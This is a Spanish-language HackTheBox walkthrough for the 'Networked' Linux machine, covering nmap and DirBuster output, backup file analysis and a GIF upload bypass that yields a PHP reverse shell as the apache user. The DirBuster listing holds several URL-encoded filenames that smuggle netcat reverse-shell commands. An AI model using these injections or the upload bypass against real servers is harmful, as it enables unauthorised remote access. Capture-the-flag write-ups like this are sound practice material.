---
layout: post
title: "Networked"
subtitle: 'HackTheBox - Easy Machine - Linux'
date: 2019-11-16 12:00:00
author: "TheusZero"
header-img: "images/post/Networked.png"
tags:
  - Linux
  - Machine
  - Explotations
  - Upgrade
  - Shell
  - Root
  - User
---

### Networked - una maquina linux que viene de la mano con php

### Nmap results:
```vim
root@BrI3fIng:~# nmap -sC -sV 10.10.10.146 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-16 18:20 -03
Nmap scan report for 10.10.10.146
Host is up (0.24s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.61 seconds
```

### Puerto 80:
>> Hello mate, we're building the new FaceMash!
  Help by funding us and be the new Tyler&Cameron!
  Join us at the pool party this Sat to get a glimpse

### Dirbuster
```vim
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sat Nov 16 18:56:31 CLST 2019
--------------------------------
http://10.10.10.146:80
--------------------------------
Directories found during testing:
Dirs found with a 200 response:
/
/icons/
/uploads/
/icons/small/
/backup/
Dirs found with a 403 response:
/cgi-bin/
--------------------------------
Files found during testing:
Files found with a 200 responce:
/index.php
/photos.php
/upload.php
/lib.php
/uploads/;nc%20-c%2010.10.15.196%201234;.php
/uploads/;%20nc%20-c%20bash%2010.10.14.197%201976%20&
/uploads/;%20nc%20-c%20bash%2010.10.14.197%201976%20&amp;
/uploads/;nc%20-c%20bash%2010.10.15.196%201234;.php
/uploads/;%20nc%2010.10.16.61%201235%20-c%20bash
/uploads/;nc%2010.10.14.156%208001%20-c%20bash;.php
/backup/backup.tar
--------------------------------
```
raro, creo que hay algunos amigos que dejaron una reverse shell hecha, aunque no se si pescarla, creo que no lo hare uwu.

### Busqueda en los directorios.
creo que tengo algunos directorios importantes

>/upload.php
>
>/uploads/
>
>/backup/

### Backup
viendo el directorio backup puedo encontrar algo interesante, hay un archivo.tar que puedo descargar asi que vamos a la obra.

```vim
root@BrI3fIng:~/HTB/Networked# mv backup.tar backup
root@BrI3fIng:~/HTB/Networked# cd backup/
root@BrI3fIng:~/HTB/Networked/backup# file backup.tar 
backup.tar: POSIX tar archive (GNU)
root@BrI3fIng:~/HTB/Networked/backup# tar -xf backup.tar 
root@BrI3fIng:~/HTB/Networked/backup# ls -la
total 36
drwxr-xr-x 2 root root  4096 nov 16 19:03 .
drwxr-xr-x 3 root root  4096 nov 16 19:03 ..
-rw-r--r-- 1 root root 10240 nov 16 19:02 backup.tar
-rw-r--r-- 1 root root   229 jul  9 07:33 index.php
-rw-r--r-- 1 root root  2001 jul  2 07:38 lib.php
-rw-r--r-- 1 root root  1871 jul  2 08:53 photos.php
-rw-r--r-- 1 root root  1331 jul  2 08:45 upload.php
```
Revisando lib.php y upload.php y photos.php encontre y de manera resumida, que los archivos que el sistema acepta son jpg y gif
por lo que intente subir un gif liviano y el sistema lo acepto, ahora que se que el sistema me acepto la imagen comienza la parte de buscar la reverse shell.

### Reverse Shell - Image GIF.
cargue un archivo bastante chistoso, un gif de my little pony. para cargarle la reverse shell ocupe vim y le inserte una reverse shell en php alfinal del archivo, pero antes de el ";" para que asi se procese con todo el contenido.

de por si no me funciono, ya que no leia el php. buscando por internet encontre que debia llevar si o si el .php, por lo que le coloqueÑ

>wena.php.gif

funciono. 

subio la reverse shell y ahora tocaba a usar netcat para esperar y conectarme, a ver si funcionaba.

### User Apache

Logre entrar como user "Apache"

